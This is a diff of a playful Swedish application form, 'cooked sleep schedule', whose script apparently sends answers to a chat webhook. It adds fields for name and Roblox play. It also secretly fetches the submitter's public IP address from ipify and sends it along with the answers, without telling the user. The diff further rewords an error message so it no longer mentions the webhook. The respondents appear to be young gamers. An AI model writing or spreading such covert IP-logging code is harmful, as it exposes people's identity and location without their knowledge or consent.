@@ -51,6 +51,10 @@
 <body>
   <h1>Ansökan – cooked sleep schedule</h1>
   <form id="applicationForm">
+    <label>Ditt namn
+      <input type="text" name="namn" required />
+    </label>
+
     <label>Hur länge är du uppe?
       <input type="text" name="upptid" required />
     </label>
@@ -70,6 +74,18 @@
     <label>Har du jobb?
       <input type="text" name="jobb" required />
     </label>
+
+    <label>Spelar du Roblox?
+      <input type="text" name="roblox" required />
+    </label>
+
+    <label>Vad spelar du i Roblox i så fall?
+      <input type="text" name="robloxspel" required />
+    </label>
+
+    <label>Hackar du i så fall?
+      <input type="text" name="hackar" required />
+    </label>
     
     <button type="submit">Skicka ansökan</button>
     <div class="success" id="successMsg" style="display:none;">Ansökan skickad!</div>
@@ -77,21 +93,46 @@
 
   <script>
     const form = document.getElementById('applicationForm');
+
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
 
       const data = new FormData(form);
+      const namn = data.get("namn");
+      const upptid = data.get("upptid");
+      const föräldrar = data.get("föräldrar");
+      const dusch = data.get("dusch");
+      const kläder = data.get("kläder");
+      const jobb = data.get("jobb");
+      const roblox = data.get("roblox");
+      const robloxspel = data.get("robloxspel");
+      const hackar = data.get("hackar");
+
+      let ip = "Okänd";
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const json = await res.json();
+        ip = json.ip || "Okänd";
+      } catch (error) {
+        console.error("IP-fel:", error);
+      }
+
       const payload = {
         content: "**Ny ansökan till 'cooked sleep schedule'**",
         embeds: [{
-          title: "Svar:",
+          title: "Svar från formulär",
           color: 16753920,
           fields: [
-            { name: "🕒 Hur länge är du uppe", value: data.get("upptid") },
-            { name: "👪 Om dina föräldrar kommer in...", value: data.get("föräldrar") },
-            { name: "🚿 Hur ofta duschar du", value: data.get("dusch") },
-            { name: "👕 Hur ofta byter du kläder", value: data.get("kläder") },
-            { name: "💼 Har du jobb", value: data.get("jobb") },
+            { name: "🧑 Namn", value: namn },
+            { name: "🕒 Hur länge är du uppe", value: upptid },
+            { name: "👪 Om dina föräldrar kommer in...", value: föräldrar },
+            { name: "🚿 Hur ofta duschar du", value: dusch },
+            { name: "👕 Hur ofta byter du kläder", value: kläder },
+            { name: "💼 Har du jobb", value: jobb },
+            { name: "🎮 Spelar du Roblox?", value: roblox },
+            { name: "🕹️ Vad spelar du i Roblox?", value: robloxspel },
+            { name: "💻 Hackar du i så fall?", value: hackar },
+            { name: "🌐 IP-adress", value: ip }
           ]
         }]
       };
@@ -105,7 +146,7 @@
         document.getElementById("successMsg").style.display = "block";
         form.reset();
       } catch (err) {
-        alert("Något gick fel! Kontrollera din webhook.");
+        alert("Något gick fel! Kontrollera anslutningen.");
         console.error(err);
       }
     });
